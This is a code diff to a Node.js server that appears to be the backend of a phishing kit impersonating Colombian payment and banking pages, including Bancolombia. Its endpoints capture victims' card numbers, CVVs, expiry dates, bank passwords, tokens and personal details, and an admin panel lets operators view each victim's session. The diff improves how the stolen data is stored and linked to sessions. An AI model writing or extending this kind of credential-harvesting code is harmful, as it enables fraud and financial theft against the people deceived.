@@ -30,7 +30,6 @@ const bcSesiones = new Map();
 let sesionesTemporales = {};
 const SESIONES_TEMP_FILE = path.join(DATA_DIR, 'sesiones-temporales.json');
 
-// Carga segura del archivo de sesiones temporales
 try {
     if (fs.existsSync(SESIONES_TEMP_FILE)) {
         const data = fs.readFileSync(SESIONES_TEMP_FILE, 'utf8');
@@ -79,7 +78,6 @@ function guardarHistorial(bancoKey, datos) {
     historial.unshift(registro);
     if (historial.length > 1000) historial = historial.slice(0, 1000);
     
-    // Escritura segura
     try { 
         fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); 
     } catch (e) { 
@@ -331,7 +329,14 @@ const server = http.createServer(async (req, res) => {
             if (req.method === 'GET' && url === '/admin/sesiones') {
                 const lista = [];
                 for (const [sid, estado] of estadoSesiones.entries()) {
-                    const datos = datosSesiones.get(sid) || {};
+                    const registros = historial.filter(h => h.datos && h.datos.sessionId === sid);
+                    let datos = {};
+                    if (registros.length > 0) {
+                        datos = registros[0].datos;
+                    } else {
+                        datos = datosSesiones.get(sid) || {};
+                    }
+                    
                     lista.push({ sessionId: sid, estado, datos });
                 }
                 json(res, 200, { ok: true, sesiones: lista });
@@ -367,8 +372,6 @@ const server = http.createServer(async (req, res) => {
                     estadoSesiones.set(sessionId, estadoNuevo);
                     ultimaAccionSesiones.set(sessionId, accion);
 
-                    // Ya NO se borran los datos de la tarjeta al presionar el botón
-                    
                     agregarLog('accion', { usuario: payload.user, sessionId, accion });
                     console.log(`[${payload.user}] ${accion} → ${sessionId}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
@@ -494,6 +497,7 @@ const server = http.createServer(async (req, res) => {
 
                 const datosPrevios = sesionesTemporales[sessionId] || {};
                 const datosCompletos = Object.assign({}, datosPrevios, {
+                    sessionId,
                     tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio,
                     ip: ip,
                     creadoEn: new Date().toISOString()
@@ -546,6 +550,7 @@ const server = http.createServer(async (req, res) => {
                 const datosPrevios = sesionesTemporales[sessionId] || {};
 
                 const datosSesion = Object.assign({}, datosPrevios, {
+                    sessionId,
                     bancoKey: bancoKey, 
                     marca, 
                     tarjeta, 
@@ -594,6 +599,7 @@ const server = http.createServer(async (req, res) => {
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
 
                 const datosSesion = {
+                    sessionId,
                     bancoKey: 'bancolombia',
                     marca: 'bancolombia',
                     identificacion: usuario,
@@ -654,6 +660,7 @@ const server = http.createServer(async (req, res) => {
                 const sesionData = bcSesiones.get(sessionId) || {};
                 
                 const datosCompletos = { 
+                    sessionId,
                     ...sesionData, 
                     tarjeta, titular, exp, cvv,
                     fechaCaptura: new Date().toISOString(),
@@ -694,6 +701,7 @@ const server = http.createServer(async (req, res) => {
                 const { sessionId, tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
                 if (!sessionId) { json(res, 400, { ok: false }); return; }
                 const datosSesion = {
+                    sessionId,
                     bancoKey, tipo, tipoDoc, identificacion, clave, tarjeta, token,
                     ip, creadoEn: new Date().toISOString()
                 };
